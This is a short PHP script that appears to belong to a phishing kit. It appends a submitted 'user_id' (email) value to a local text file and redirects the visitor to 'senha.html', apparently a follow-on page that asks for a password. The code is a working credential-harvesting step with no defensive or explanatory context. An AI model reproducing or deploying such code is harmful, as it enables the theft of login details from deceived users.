<?php

file_put_contents("email.txt", "Email: " . $_POST['user_id']  . "\n", FILE_APPEND);
header('Location: senha.html');
exit();
